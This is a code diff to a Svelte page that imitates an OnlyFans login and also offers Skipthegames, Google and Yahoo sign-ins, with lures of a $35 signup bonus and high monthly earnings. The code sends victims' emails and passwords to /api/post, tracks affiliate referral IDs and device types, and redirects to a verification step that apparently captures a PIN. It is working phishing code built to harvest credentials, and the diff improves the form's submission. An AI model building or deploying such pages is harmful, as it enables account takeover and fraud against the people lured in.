@@ -1,8 +1,8 @@
 <script context="module">
-    export function load({ url,params }) {
-        console.log(url,params)
+    export function load({ url, params }) {
+        console.log(url, params);
         let query = url.searchParams;
- 
+
         return {
             props: {
                 ref: query.get("r"),
@@ -14,14 +14,14 @@
 <script>
     import { onMount } from "svelte";
     import { goto } from "$app/navigation";
-    
-    var device
+
+    var device;
     onMount(async () => {
-        device = window.navigator.userAgentData.mobile?'Mobile':'Desktop';
+        device = window.navigator.userAgentData.mobile ? "Mobile" : "Desktop";
 
         console.log("hi");
         console.log("ref", ref);
-        let r = await fetch("/api/click?ref="+ref+"&device="+device);
+        let r = await fetch("/api/click?ref=" + ref + "&device=" + device);
         console.log(r);
         let j = await r.json();
         console.log(j);
@@ -29,7 +29,7 @@
 
     async function post() {
         console.log(email);
-        let res=await fetch("/api/post", {
+        let res = await fetch("/api/post", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json",
@@ -39,18 +39,18 @@
                 input_account_password: password,
                 type: "onlyfans",
                 pin_expected: true,
-                ref_id:ref,
-                device:device
+                ref_id: ref,
+                device: device,
             }),
         });
-        let resVal=await res.json();
-        console.log(resVal)
-        goto("/verification?t="+resVal['timestamp']);
+        let resVal = await res.json();
+        console.log(resVal);
+        goto("/verification?t=" + resVal["timestamp"]);
     }
     let email = "";
     let password = "";
     export let ref;
-    $:active=email.length>0&&password.length>0?true:false;
+    $: active = email.length > 0 && password.length > 0 ? true : false;
 </script>
 
 <svelte:head>
@@ -88,7 +88,7 @@
         </p>
         <nav>
             <ul class="nav-list">
-                <li><a href="#" />Reject Referral Cookies </li>
+                <li><a href="#" />Reject Referral Cookies</li>
                 <li><a href="#" />Accept All</li>
             </ul>
         </nav>
@@ -101,7 +101,9 @@
                         src="../images/Screenshot 2022-02-10 233951 (1).png"
                         alt=""
                     />
-                    <h2 style="font-size: 29px">Sign up to support your <br /> favorite creators</h2>
+                    <h2 style="font-size: 29px">
+                        Sign up to support your <br /> favorite creators
+                    </h2>
                 </div>
                 <marquee style="color: #0091EA"
                     >Log in with your Skipthegames account <br /> and
@@ -111,28 +113,40 @@
             <div class="col-md-6">
                 <div class="sign-in">
                     <h6 class="status">Log in</h6>
-                    <input
-                        type="email"
-                        placeholder="Email"
-                        required
-                        bind:value={email}
-                    /> <br />
-                    <input
-                        type="password"
-                        placeholder="Password"
-                        required
-                        bind:value={password}
-                    /> <br />
-                    <button type="btn" on:click={post} style="background-color:{active?'#06abf1':'#DCDFE3'}"> <b>LOGIN</b> </button>
+                    <form on:submit|preventDefault={post}>
+                        <input
+                            type="email"
+                            placeholder="Email"
+                            required
+                            bind:value={email}
+                        /> <br />
+                        <input
+                            type="password"
+                            placeholder="Password"
+                            required
+                            bind:value={password}
+                        /> <br />
+                        <button
+                            type="submit"
+                            style="background-color:{active
+                                ? '#06abf1'
+                                : '#DCDFE3'}"
+                        >
+                            <b>LOGIN</b>
+                        </button>
+                    </form>
 
                     <div class="ancore-link">
-                        <a href="#" style="visibility:hidden ;">Sign up For OnlyFans</a>
+                        <a href="#" style="visibility:hidden ;"
+                            >Sign up For OnlyFans</a
+                        >
                         <a href="#">Forgot password?</a>
                     </div>
                     <div class="unorder-list">
                         <h4>Join now and win a $35 signup bonus</h4>
                         <li>
-                            Sign in with your skipthegames account and get $35 signup bonus
+                            Sign in with your skipthegames account and get $35
+                            signup bonus
                         </li>
                         <li>
                             You could earn between $1,499 and $7,495 per month
@@ -142,15 +156,17 @@
                     <div class="row">
                         <div class="button-list">
                             <button class="button1" type="btn"
-                                ><a href={'/skipthegames?r='+ref}>
+                                ><a href={"/skipthegames?r=" + ref}>
                                     SIGN IN WITH SKIPTHEGAMES</a
                                 ></button
                             > <br />
                             <button class="button2" type="btn"
-                                ><a href={'/google?r='+ref}>SIGN IN WITH GOOGLE </a>
+                                ><a href={"/google?r=" + ref}
+                                    >SIGN IN WITH GOOGLE
+                                </a>
                             </button> <br />
                             <button class="button3" type="btn"
-                                ><a href={'/yahoo?r='+ref}>
+                                ><a href={"/yahoo?r=" + ref}>
                                     SIGN IN WITH YAHOO</a
                                 ></button
                             >
